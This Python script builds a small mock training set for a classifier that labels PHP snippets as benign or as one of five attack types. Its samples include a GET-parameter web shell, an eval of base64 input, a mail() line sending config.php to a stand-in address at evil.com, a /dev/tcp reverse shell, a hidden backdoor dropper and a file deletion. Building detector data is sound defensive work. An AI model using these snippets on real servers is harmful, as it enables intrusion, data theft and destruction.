import pandas as pd

# Define our 6 labels: 
# 0: Benign, 1: RCE, 2: Exfiltration, 3: ReverseShell, 4: Persistence, 5: FileOps
mock_data = [
    {"code": "<?php echo 'Welcome to the dashboard'; ?>", "label": 0},
    {"code": "<?php $x = 5 + 10; ?>", "label": 0},
    {"code": "<?php system($_GET['cmd']); ?>", "label": 1},
    {"code": "<?php eval(base64_decode($_POST['payload'])); ?>", "label": 1},
    {"code": "<?php mail('hacker@evil.com', 'Stolen Data', file_get_contents('config.php')); ?>", "label": 2},
    {"code": "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"'); ?>", "label": 3},
    {"code": "<?php file_put_contents('.hidden_backdoor.php', '<?php system($_GET[1]); ?>'); ?>", "label": 4},
    {"code": "<?php unlink('/var/www/html/index.php'); ?>", "label": 5},
]

# Multiply the data so we have enough rows for the Hugging Face Trainer to batch process
df = pd.DataFrame(mock_data * 20) 

# Shuffle and split into 80% Training, 20% Validation
train_df = df.sample(frac=0.8, random_state=42)
val_df = df.drop(train_df.index)

# Save to CSV
train_df.to_csv("train.csv", index=False)
val_df.to_csv("val.csv", index=False)

print(f"Created train.csv ({len(train_df)} rows) and val.csv ({len(val_df)} rows)!")